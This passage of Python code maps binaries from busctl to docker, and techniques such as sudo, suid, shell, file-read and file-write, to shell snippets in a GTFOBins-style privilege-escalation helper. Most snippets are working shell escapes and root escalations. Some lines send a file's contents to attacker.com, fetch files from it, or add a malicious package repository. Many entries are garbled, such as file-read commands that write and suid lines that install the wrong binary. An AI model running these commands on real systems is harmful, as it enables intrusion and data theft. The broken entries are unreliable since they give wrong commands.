            bins.append("busctl --show-machine\n!/bin/shsudo install -m =xs $(which busctl) .\n./busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2 1>&2'")
        elif zip_options == "file-write":
            bins.append("busctl --user call org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager StartUnit s ""your-service.service"" ""replace""")
        elif zip_options == "file-read":
            bins.append("busctl --user call <service-name> <object-path> <interface-name> <method-name> s ""path/to/your/file.txt""")

    elif zip_command == "byebug":
        if zip_options == "Shell":
            bins.append("TF=$(mktemp)\necho 'system(""/bin/sh"")' > $TF\nbyebug $TF\ncontinue")
        elif zip_options == "suid":
            bins.append("TF=$(mktemp)\necho 'system(""/bin/sh"")' > $TF\n./byebug $TF\ncontinue")
        elif zip_options == "sudo":
            bins.append("TF=$(mktemp)\necho 'system(""/bin/sh"")' > $TF\nsudo byebug $TF\ncontinue")
        elif zip_options == "file-read":
            bins.append("ruby -r 'byebug' read_file.rb")
        elif zip_options == "file-write":
            bins.append("ruby -r 'byebug' write_to_file.rb")

    elif zip_command == "bzip2":
        if zip_options == "sudo":
            bins.append("LFILE=file_to_read\nsudo bzip2 -c $LFILE | bzip2 -d")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which bzip2) .\nLFILE=file_to_read\n./bzip2 -c $LFILE | bzip2 -d")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\nbzip2 -c $LFILE | bzip2 -d")
        elif zip_options == "file-write":
            bins.append("tar -cvjf malicious.tar.bz2 reverse_shell.sh")
        elif zip_options == "Shell":
            bins.append("tar -cvf malicious.tar reverse_shell.sh\nbzip2 malicious.tar")

    elif zip_command == "c89":
        if zip_options == "Shell":
            bins.append("c89 -wrapper /bin/sh,-s .")
        elif zip_options == "sudo":
            bins.append("sudo c89 -wrapper /bin/sh,-s .")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\nc89 -x c -E ""$LFILE""")
        elif zip_options == "file-write":
            bins.append("LFILE=file_to_delete\nc89 -xc /dev/null -o $LFILE")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which c89) .\nc89 -wrapper /bin/sh,-s .")

    elif zip_command == "c99":
        if zip_options == "Shell":
            bins.append("c99 -wrapper /bin/sh,-s .")
        elif zip_options == "sudo":
            bins.append("sudo c99 -wrapper /bin/sh,-s .")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\nc99 -x c -E ""$LFILE""")
        elif zip_options == "file-write":
            bins.append("LFILE=file_to_delete\nc99 -xc /dev/null -o $LFILE")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which c99) .\nc99 -wrapper /bin/sh,-s .")

    elif zip_command == "cabal":
        if zip_options == "Shell":
            bins.append("cabal exec -- /bin/sh")
        elif zip_options == "sudo":
            bins.append("sudo cabal exec -- /bin/sh")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which cabal) .\n./cabal exec -- /bin/sh -p")
        elif zip_options == "file-write":
            bins.append("cabal build")
        elif zip_options == "file-read":
            bins.append("cabal build\ncabal run")

    elif zip_command == "cancel":
        if zip_options == "file-write":
            bins.append("RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\ncancel -u ""$(cat $LFILE)"" -h $RHOST:$RPORT")
        elif zip_options == "file-read":
            bins.append("Not available")
        elif zip_options == "Shell":
            bins.append("Not available")
        elif zip_options == "suid":
            bins.append("Not available")
        elif zip_options == "sudo":
            bins.append("Not available")

    elif zip_command == "capsh":
        if zip_options == "Shell":
            bins.append("capsh --")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which capsh) .\n./capsh --gid=0 --uid=0 --")
        elif zip_options == "sudo":
            bins.append("sudo capsh --")
        elif zip_options == "file-read":
            bins.append("sudo setcap cap_dac_read_search=eip /path/to/binary")
        elif zip_options == "file-write":
            bins.append("capsh --caps=""cap_dac_write=eip"" -- -c ""command_to_run""")

    elif zip_command == "cdist":
        if zip_options == "Shell":
            bins.append("cdist shell -s /bin/sh")
        elif zip_options == "sudo":
            bins.append("sudo cdist shell -s /bin/sh")
        elif zip_options == "suid":
            bins.append("username ALL=(ALL) NOPASSWD: /usr/bin/cdist")
        elif zip_options == "file-read":
            bins.append("setcap cap_dac_read_search=eip /usr/bin/cdist")
        elif zip_options == "file-write":
            bins.append("getcap /usr/bin/cdist")

    elif zip_command == "certbot":
        if zip_options == "Shell":
            bins.append("TF=$(mktemp -d)\ncertbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0'")
        elif zip_options == "sudo":
            bins.append("TF=$(mktemp -d)\nsudo certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0'")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which certbot) .\nTF=$(mktemp -d)\ncertbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0'")
        elif zip_options == "file-write":
            bins.append("sudo certbot renew")
        elif zip_options == "file-read":
            bins.append("sudo -u certbot-user certbot renew --dry-run")
    
    elif zip_command == "check_by_ssh":
        if zip_options == "Shell":
            bins.append("check_by_ssh -o ""ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)"" -H localhost -C xx")
        elif zip_options == "sudo":
            bins.append("sudo check_by_ssh -o ""ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)"" -H localhost -C xx")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which check_by_ssh) .\ncheck_by_ssh -o ""ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)"" -H localhost -C xx")
        elif zip_options == "file-write":
            bins.append("echo ""Test message"" >> /var/log/nagios/check_by_ssh.log")
        elif zip_options == "file-read":
            bins.append("cat ""FILE"" /var/log/nagios/check_by_ssh.log")

    elif zip_command == "check_cups":
        if zip_options == "sudo":
            bins.append("LFILE=file_to_read\nsudo check_cups --extra-opts=@$LFILE")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\ncheck_cups --extra-opts=@$LFILE")
        elif zip_options == "file-write":
            bins.append("LFILE=file_to_write\ncheck_cups --extra-opts=@$LFILE")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which check_cups) .\nLFILE=file_to_read\ncheck_cups --extra-opts=@$LFILE")
        elif zip_options == "Shell":
            bins.append("echo ""check_cups -H localhost -p 9100"" > rvshell.sh\nbash")

    elif zip_command == "check_log":
        if zip_options == "sudo":
            bins.append("LFILE=file_to_write\nINPUT=input_file\nsudo check_log -F $INPUT -O $LFILE")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\nOUTPUT=output_file\ncheck_log -F $LFILE -O $OUTPUT\ncat $OUTPUT")
        elif zip_options == "file-write":
            bins.append("LFILE=file_to_write\nINPUT=input_file\ncheck_log -F $INPUT -O $LFILE")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which check_log) .\nLFILE=file_to_write\nINPUT=input_file\nsudo check_log -F $INPUT -O $LFILE")
        elif zip_options == "Shell":
            bins.append("/usr/local/nagios/libexec/check_log -f /var/log/syslog -q ""error"" -w 10 -c 20\nbash")

    elif zip_command == "check_memory":
        if zip_options == "sudo":
            bins.append("LFILE=file_to_read\nsudo check_memory --extra-opts=@$LFILE")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\ncheck_memory --extra-opts=@$LFILE")
        elif zip_options == "file-write":
            bins.append("LFILE=file_to_write\ncheck_memory --extra-opts=@$LFILE")
        elif zip_options == "Shell":
            bins.append("/usr/local/nagios/libexec/check_memory -w 80 -c 90\nbash")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which check_memory) .")

    elif zip_command == "check_raid":
        if zip_options == "sudo":
            bins.append("LFILE=file_to_read\nsudo check_raid --extra-opts=@$LFILE")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\ncheck_raid --extra-opts=@$LFILE")
        elif zip_options == "file-write":
            bins.append("LFILE=file_to_write\ncheck_raid --extra-opts=@$LFILE")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which check_raid) .\nLFILE=file_to_read\ncheck_raid --extra-opts=@$LFILE")
        elif zip_options == "Shell":
            bins.append("/usr/local/nagios/libexec/check_raid -w 80 -c 90\nbash")

    elif zip_command == "check_ssl_cert":
        if zip_options == "sudo":
            bins.append("COMMAND=id\nOUTPUT=output_file\nTF=$(mktemp)\necho ""$COMMAND | tee $OUTPUT"" > $TF\nchmod +x $TF\numask 022\ncheck_ssl_cert --curl-bin $TF -H example.net\ncat $OUTPUT")
        elif zip_options == "file-read":
            bins.append("COMMAND=id\nOUTPUT=output_file\nTF=$(mktemp)\necho ""$COMMAND | tee $OUTPUT"" > $TF\nchmod +x $TF\ncheck_ssl_cert --curl-bin $TF -H example.net\ncat $OUTPUT")
        elif zip_options == "file-write":
            bins.append("COMMAND=id\nOUTPUT=output_file\nTF=$(mktemp)\necho ""$COMMAND | tee $OUTPUT"" > $TF\nchmod +x $TF\ncheck_ssl_cert --curl-bin $TF -H example.net\n./$OUTPUT")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which check_ssl_cert) .\nCOMMAND=id\nOUTPUT=output_file\nTF=$(mktemp)\necho ""$COMMAND | tee $OUTPUT"" > $TF\nchmod +x $TF\ncheck_ssl_cert --curl-bin $TF -H example.net\ncat $OUTPUT")
        elif zip_options == "Shell":
            bins.append("/usr/local/nagios/libexec/check_ssl_cert -H example.com -w 30 -c 15\nbash")

    elif zip_command == "check_statusfile":
        if zip_options == "sudo":
            bins.append("LFILE=file_to_read\nsudo check_statusfile $LFILE")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\ncheck_statusfile $LFILE")
        elif zip_options == "file-write":
            bins.append("LFILE=file_to_write\ncheck_statusfile $LFILE")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which check_statusfile) .\nLFILE=file_to_read\ncheck_statusfile $LFILE")
        elif zip_options == "Shell":
            bins.append("/usr/local/nagios/libexec/check_statusfile -H example.com -w 30 -c 15\nbash")

    elif zip_command == "choom":
        if zip_options == "sudo":
            bins.append("sudo choom -n 0 /bin/sh")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which choom) .\n./choom -n 0 -- /bin/sh -p")
        elif zip_options == "Shell":
            bins.append("choom -n 0 /bin/sh")
        elif zip_options == "file-read":
            bins.append("choom -p <pid> --set <priority_level>\n cat FILE")
        elif zip_options == "file-write":
            bins.append("choom -p <pid> --set <priority_level>\n echo 'text' > FILE")

    elif zip_command == "chown":
        if zip_options == "sudo":
            bins.append("LFILE=file_to_change\nsudo chown $(id -un):$(id -gn) $LFILE")
        elif zip_options == "suid":
            bins.append("LFILE=file_to_change\n./chown $(id -un):$(id -gn) $LFILE")
        elif zip_options == "file-read":
            bins.append("chown user:group file.txt")
        elif zip_options == "file-write":
            bins.append("chmod u=rw,g=r,o= file.txt")
        elif zip_options == "Shell":
            bins.append("bash -c ""chown user:group /path/to/file && exec bash""")

    elif zip_command == "chroot":
        if zip_options == "sudo":
            bins.append("sudo chroot /")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which chroot) .\n./chroot / /bin/sh -p")
        elif zip_options == "file-read":
            bins.append("mkdir /newroot\ncp /bin/bash /newroot/bin/\ncp /lib/x86_64-linux-gnu/libc.so.6 /newroot/lib/x86_64-linux-gnu/\nchroot /newroot /bin/bash")
        elif zip_options == "file-write":
            bins.append("mkdir -p /newroot/var/log\ntouch /newroot/var/log/mylogfile.log\nchmod 666 /newroot/var/log/mylogfile.log\nchroot /newroot /bin/bash\necho ""Log entry at $(date)"" >> /var/log/mylogfile.log")
        elif zip_options == "Shell":
            bins.append("chroot <new_root_directory> /bin/bash")

    elif zip_command == "clamscan":
        if zip_options == "sudo":
            bins.append("LFILE=file_to_read\nTF=$(mktemp -d)\ntouch $TF/empty.yara\nsudo clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which clamscan) .\nLFILE=file_to_read\nTF=$(mktemp -d)\ntouch $TF/empty.yara\n./clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\nTF=$(mktemp -d)\ntouch $TF/empty.yara\nclamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'")
        elif zip_options == "file-write":
            bins.append("LFILE=file_to_write\nTF=$(mktemp -d)\ntouch $TF/empty.yara\nclamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'")
        elif zip_options == "Shell":
            bins.append("clamscan -r /path/to/directory")

    elif zip_command == "cmp":
        if zip_options == "sudo":
            bins.append("LFILE=file_to_read\nsudo cmp $LFILE /dev/zero -b -l")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which cmp) .\nLFILE=file_to_read\n./cmp $LFILE /dev/zero -b -l")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\ncmp $LFILE /dev/zero -b -l")
        elif zip_options == "file-write":
            bins.append("LFILE=file_to_write\ncmp $LFILE /dev/zero -b -l")
        elif zip_options == "Shell":
            bins.append("./compare_files.sh file1.txt file2.txt\ncmp -s file1.txt file2.txt")

    elif zip_command == "cobc":
        if zip_options == "Shell":
            bins.append("TF=$(mktemp -d)\necho 'CALL ""SYSTEM"" USING ""/bin/sh"".' > $TF/x\ncobc -xFj --frelax-syntax-checks $TF/x")
        elif zip_options == "sudo":
            bins.append("TF=$(mktemp -d)\necho 'CALL ""SYSTEM"" USING ""/bin/sh"".' > $TF/x\nsudo cobc -xFj --frelax-syntax-checks $TF/x")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which cmp) .\nTF=$(mktemp -d)\necho 'CALL ""SYSTEM"" USING ""/bin/sh"".' > $TF/x\nsudo cobc -xFj --frelax-syntax-checks $TF/x")
        elif zip_options == "file-read":
            bins.append("cobc -x /path/to/file/fileread.cob")
        elif zip_options == "file-write":
            bins.append("cobc -x /path/to/file/fileread.cob")

    elif zip_command == "column":
        if zip_options == "sudo":
            bins.append("LFILE=file_to_read\nsudo column $LFILE")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which column) .\nLFILE=file_to_read\n./column $LFILE")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\ncolumn $LFILE")
        elif zip_options == "file-write":
            bins.append("LFILE=file_to_write\ncolumn $LFILE")
        elif zip_options == "Shell":
            bins.append("LFILE=file_to_read\ncolumn /etc/shadow")

    elif zip_command == "comm":
        if zip_options == "sudo":
            bins.append("LFILE=file_to_read\nsudo comm $LFILE /dev/null 2>/dev/null")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which comm) .\nLFILE=file_to_read\ncomm $LFILE /dev/null 2>/dev/null")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\ncomm $LFILE /dev/null 2>/dev/null")
        elif zip_options == "file-write":
            bins.append("LFILE=file_to_write\ncomm $LFILE /dev/null 2>/dev/null")
        elif zip_options == "Shell":
            bins.append("comm <(sort file1.txt) <(sort file2.txt)")

    elif zip_command == "composer":
        if zip_options == "Shell":
            bins.append("TF=$(mktemp -d)\necho '{""scripts"":{""x"":""/bin/sh -i 0<&3 1>&3 2>&3""}}' >$TF/composer.json\ncomposer --working-dir=$TF run-script x")
        elif zip_options == "sudo":
            bins.append("TF=$(mktemp -d)\necho '{""scripts"":{""x"":""/bin/sh -i 0<&3 1>&3 2>&3""}}' >$TF/composer.json\nsudo composer --working-dir=$TF run-script x")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which composer) .\nTF=$(mktemp -d)\necho '{""scripts"":{""x"":""/bin/sh -i 0<&3 1>&3 2>&3""}}' >$TF/composer.json\ncomposer --working-dir=$TF run-script x")
        elif zip_options == "file-read":
            bins.append("composer init\nphp file-reader.php")
        elif zip_options == "file-write":
            bins.append("composer init\nphp file-writer.php")

    elif zip_command == "cowsay":
        if zip_options == "Shell":
            bins.append("TF=$(mktemp)\necho 'exec ""/bin/sh"";' >$TF\ncowsay -f $TF x")
        elif zip_options == "sudo":
            bins.append("TF=$(mktemp)\necho 'exec ""/bin/sh"";' >$TF\nsudo cowsay -f $TF x")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which cowsay) .\nTF=$(mktemp)\necho 'exec ""/bin/sh"";' >$TF\nsudo cowsay -f $TF x")
        elif zip_options == "file-read":
            bins.append("cat filename | cowsay")
        elif zip_options == "file-write":
            bins.append("cowsay ""Your message here"" > output.txt")

    elif zip_command == "cowthink":
        if zip_options == "Shell":
            bins.append("TF=$(mktemp)\necho 'exec ""/bin/sh"";' >$TF\ncowthink -f $TF x")
        elif zip_options == "sudo":
            bins.append("TF=$(mktemp)\necho 'exec ""/bin/sh"";' >$TF\nsudo cowthink -f $TF x")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which cowthink) .\nTF=$(mktemp)\necho 'exec ""/bin/sh"";' >$TF\nsudo cowthink -f $TF x")
        elif zip_options == "file-read":
            bins.append("cat filename | cowthink")
        elif zip_options == "file-write":
            bins.append("cowthink ""Your message here"" > output.txt")

    elif zip_command == "cpan":
        if zip_options == "sudo":
            bins.append("sudo cpan\n! exec '/bin/bash'")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which cpan) .\nsudo cpan\n! exec '/bin/bash'")
        elif zip_options == "file-read":
            bins.append("export URL=http://attacker.com/file_to_get\ncpan\n! use File::Fetch; my $file = (File::Fetch->new(uri => ""$ENV{URL}""))->fetch();")
        elif zip_options == "file-write":
            bins.append("cpan\n! use HTTP::Server::Simple; my $server= HTTP::Server::Simple->new(); $server->run();")
        elif zip_options == "Shell":
            bins.append("cpan\n! exec '/bin/bash'")

    elif zip_command == "cpio":
        if zip_options == "sudo":
            bins.append("echo '/bin/sh </dev/tty >/dev/tty' >localhost\nsudo cpio -o --rsh-command /bin/sh -F localhost:")
        elif zip_options == "Shell":
            bins.append("echo '/bin/sh </dev/tty >/dev/tty' >localhost\ncpio -o --rsh-command /bin/sh -F localhost:")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\necho ""$LFILE"" | cpio -o")
        elif zip_options == "file-write":
            bins.append("LFILE=file_to_write\nLDIR=where_to_write\necho DATA >$LFILE\necho $LFILE | cpio -up $LDIR")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which cpio) .\nLFILE=file_to_read\nTF=$(mktemp -d)\necho ""$LFILE"" | ./cpio -R $UID -dp $TF\ncat ""$TF/$LFILE""")

    elif zip_command == "cpulimit":
        if zip_options == "sudo":
            bins.append("sudo cpulimit -l 100 -f /bin/sh")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which cpulimit) .\n./cpulimit -l 100 -f -- /bin/sh -p")
        elif zip_options == "file-read":
            bins.append("cpulimit -l 50 -e cat input.txt")
        elif zip_options == "file-write":
            bins.append("cpulimit -l 50 -e echo ""This is some text"" > output.txt")
        elif zip_options == "Shell":
            bins.append("cpulimit -l 100 -f /bin/sh")

    elif zip_command == "crash":
        if zip_options == "sudo":
            bins.append("sudo crash -h\n!sh")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which crash) .\ncrash -h\n!sh")
        elif zip_options == "Shell":
            bins.append("crash -h\n!sh")
        elif zip_options == "file-read":
            bins.append("crash /path/to/vmcore /path/to/vmlinux")
        elif zip_options == "file-write":
            bins.append("crash> kmem -s 0x1000 > kernel_memory_dump.txt")

    elif zip_command == "crontab":
        if zip_options == "sudo":
            bins.append("sudo crontab -e")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which crontab) .\ncrontab -e")
        elif zip_options == "file-read":
            bins.append("0 5 * * * cat /path/to/your/file.txt >> /path/to/logfile.log")
        elif zip_options == "file-write":
            bins.append("0 5 * * * echo ""Hello, World!"" > /path/to/output.txt")
        elif zip_options == "Shell":
            bins.append("* * * * * /bin/bash -c 'echo ""Hello from the shell""")

    elif zip_command == "csh":
        if zip_options == "Shell":
            bins.append("csh")
        elif zip_options == "sudo":
            bins.append("sudo csh")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which csh) .\n./csh -b")
        elif zip_options == "file-write":
            bins.append("export LFILE=file_to_write\nash -c 'echo DATA > $LFILE'")
        elif zip_options == "file-read":
            bins.append("export LFILE=file_to_read\nash -c 'cat DATA > $LFILE'")

    elif zip_command == "csplit":
        if zip_options == "sudo":
            bins.append("LFILE=file_to_read\ncsplit $LFILE 1\ncat xx01")
        elif zip_options == "file-write":
            bins.append("TF=$(mktemp)\necho ""DATA"" > $TF\nLFILE=file_to_write\ncsplit -z -b ""%d$LFILE"" $TF 1")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\ncsplit $LFILE 1\ncat xx01")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which csplit) .\nLFILE=file_to_read\ncsplit $LFILE 1\ncat xx01")
        elif zip_options == "Shell":
            bins.append("csplit input.txt 10 && /bin/bash")

    elif zip_command == "csvtool":
        if zip_options == "Shell":
            bins.append("csvtool call '/bin/sh;false' /etc/passwd")
        elif zip_options == "sudo":
            bins.append("sudo csvtool call '/bin/sh;false' /etc/passwd")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which csvtool) .\nLFILE=file_to_read\n./csvtool trim t $LFILE")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\ncsvtool trim t $LFILE")
        elif zip_options == "file-write":
            bins.append("LFILE=file_to_write\nTF=$(mktemp)\necho DATA > $TF\ncsvtool trim t $TF -o $LFILE")

    elif zip_command == "cupsfilter":
        if zip_options == "sudo":
            bins.append("LFILE=file_to_read\nsudo cupsfilter -i application/octet-stream -m application/octet-stream $LFILE")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which cupsfilter) .\nLFILE=file_to_read\n./cupsfilter -i application/octet-stream -m application/octet-stream $LFILE")
        elif zip_options == "file-read":
            bins.append("FILE=file_to_read\ncupsfilter -i application/octet-stream -m application/octet-stream $LFILE")
        elif zip_options == "file-write":
            bins.append("FILE=file_to_write\ncupsfilter -i application/octet-stream -m application/octet-stream $LFILE")
        elif zip_options == "Shell":
            bins.append("bash -c '[ -f ""$1"" ] && cupsfilter ""$1"" > ""${1%.*}.pdf"" && echo ""Conversion successful: ${1%.*}.pdf"" || echo ""Error: File not found!""' -- inputfile.txt")

    elif zip_command == "cut":
        if zip_options == "sudo":
            bins.append("LFILE=file_to_read\nsudo cut -d """" -f1 ""$LFILE""")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which cut) .\nLFILE=file_to_read\n./cut -d """" -f1 ""$LFILE""")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\ncut -d """" -f1 ""$LFILE""")
        elif zip_options == "file-write":
            bins.append("LFILE=file_to_write\ncut -d """" -f1 ""$LFILE""")
        elif zip_options == "Shell":
            bins.append("cut -d ' ' -f 1 /etc/shells | head -n 1 | xargs -I {} sh -c '{}'")

    elif zip_command == "dash":
        if zip_options == "sudo":
            bins.append("sudo dash")
        elif zip_options == "Shell":
            bins.append("dash")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which dash) .\n./dash -p")
        elif zip_options == "file-write":
            bins.append("export LFILE=file_to_write\ndash -c 'echo DATA > $LFILE'")
        elif zip_options == "file-read":
            bins.append("export LFILE=file_to_read\ndash -c 'cat DATA > $LFILE'")

    elif zip_command == "date":
        if zip_options == "sudo":
            bins.append("LFILE=file_to_read\nsudo date -f $LFILE")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which date) .\nLFILE=file_to_read\n./date -f $LFILE")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\ndate -f $LFILE")
        elif zip_options == "file-write":
            bins.append("LFILE=file_to_write\ndate -f $LFILE")
        elif zip_options == "Shell":
            bins.append("$(date); bash")

    elif zip_command == "dc":
        if zip_options == "sudo":
            bins.append("sudo dc -e '!/bin/sh'")
        elif zip_options == "Shell":
            bins.append("dc -e '!/bin/sh'")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which dc) .\n./dc -e '!/bin/sh'")
        elif zip_options == "file-read":
            bins.append("cat FILE.txt | dc")
        elif zip_options == "file-write":
            bins.append("echo ""SCRIPT"" | dc > script.txt")

    elif zip_command == "debugfs":
        if zip_options == "sudo":
            bins.append("sudo debugfs\n!/bin/sh")
        elif zip_options == "Shell":
            bins.append("debugfs\n!/bin/sh")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which debugfs) .\n./debugfs\n!/bin/sh")
        elif zip_options == "file-read":
            bins.append("debugfs:  cat /path/to/file")
        elif zip_options == "file-write":
            bins.append("debugfs:  write /path/to/file")

    elif zip_command == "dialog":
        if zip_options == "sudo":
            bins.append("LFILE=file_to_read\nsudo dialog --textbox ""$LFILE"" 0 0")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which dialog) .\nLFILE=file_to_read\n./dialog --textbox ""$LFILE"" 0 0")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\ndialog --textbox ""$LFILE"" 0 0")
        elif zip_options == "file-write":
            bins.append("LFILE=file_to_write\ndialog --textbox ""$LFILE"" 0 0")
        elif zip_options == "Shell":
            bins.append("bash -c 'dialog --clear --title ""Main Menu"" --menu ""Choose an option:"" 15 50 4 1 ""Show Date"" 2 ""Show Disk Usage"" 3 ""Show Uptime"" 4 ""Exit"" 2>/tmp/menu_choice.txt; choice=$(cat /tmp/menu_choice.txt); case $choice in 1) dialog --msgbox ""Current Date: $(date)"" 10 50;; 2) dialog --msgbox ""Disk Usage: $(df -h)"" 15 50;; 3) dialog --msgbox ""Uptime: $(uptime)"" 10 50;; 4) dialog --msgbox ""Exiting..."" 10 50;; *) dialog --msgbox ""Invalid option."" 10 50;; esac; rm /tmp/menu_choice.txt'")

    elif zip_command == "diff":
        if zip_options == "sudo":
            bins.append("LFILE=file_to_read\nsudo diff --line-format=%L /dev/null $LFILE")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which diff) .\nLFILE=file_to_read\n./diff --line-format=%L /dev/null $LFILE")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\ndiff --line-format=%L /dev/null $LFILE")
        elif zip_options == "file-write":
            bins.append("LFILE=file_to_write\ndiff --line-format=%L /dev/null $LFILE")
        elif zip_options == "Shell":
            bins.append("diff <(echo ""A"") <(echo ""B; /bin/bash"")")

    elif zip_command == "dig":
        if zip_options == "sudo":
            bins.append("LFILE=file_to_read\nsudo dig -f $LFILE")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which dig) .\nLFILE=file_to_read\n./dig -f $LFILE")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\ndig -f $LFILE")
        elif zip_options == "file-write":
            bins.append("LFILE=file_to_write\ndig -f $LFILE")
        elif zip_options == "Shell":
            bins.append("dig +short example.com @attacker.com")

    elif zip_command == "distcc":
        if zip_options == "sudo":
            bins.append("sudo distcc /bin/sh")
        elif zip_options == "Shell":
            bins.append("distcc /bin/sh")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which distcc) .\n./distcc /bin/sh -p")
        elif zip_options == "file-read":
            bins.append("distcc gcc -o /tmp/output /etc/passwd")
        elif zip_options == "file-write":
            bins.append("distcc gcc -o /etc/passwd malicious_source.c")

    elif zip_command == "dmidecode":
        if zip_options == "sudo":
            bins.append("LFILE=file_to_write\nsudo dmidecode --no-sysfs -d x.dmi --dump-bin ""$LFILE""")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which distcc) .\nLFILE=file_to_write\n./dmidecode --no-sysfs -d x.dmi --dump-bin ""$LFILE""")
        elif zip_options == "file-write":
            bins.append("LFILE=file_to_write\ndmidecode --no-sysfs -d x.dmi --dump-bin ""$LFILE""")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\ndmidecode --no-sysfs -d x.dmi --dump-bin ""$LFILE""")
        elif zip_options == "Shell":
            bins.append("sudo dmidecode; /bin/bash")

    elif zip_command == "dmsetup":
        if zip_options == "sudo":
            bins.append("sudo dmsetup create base <<EOF\n0 3534848 linear /dev/loop0 94208\nEOF\nsudo dmsetup ls --exec '/bin/sh -s'")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which dmsetup) .\nsudo dmsetup create base <<EOF\n0 3534848 linear /dev/loop0 94208\nEOF\nsudo dmsetup ls --exec '/bin/sh -s'")
        elif zip_options == "file-read":
            bins.append("dmsetup ls")
        elif zip_options == "file-write":
            bins.append("dmsetup create snapshot --size 1G /dev/vgname/lvname /dev/snapshot")
        elif zip_options == "Shell":
            bins.append("sudo dmsetup ls; /bin/bash")

    elif zip_command == "dnf":
        if zip_options == "sudo":
            bins.append("sudo dnf install -y x-1.0-1.noarch.rpm")
        elif zip_options == "suid":
            bins.append("sudo ./dnf install -y x-1.0-1.noarch.rpm")
        elif zip_options == "file-read":
            bins.append("dnf provides */filename")
        elif zip_options == "file-write":
            bins.append("sudo dnf config-manager --add-repo http://malicious-repo.com/repo.repo")
        elif zip_options == "Shell":
            bins.append("sudo dnf config-manager --add-repo http://malicious-shell-repo.com/repo.repo")

    elif zip_command == "docker":
        if zip_options == "sudo":
            bins.append("sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh")
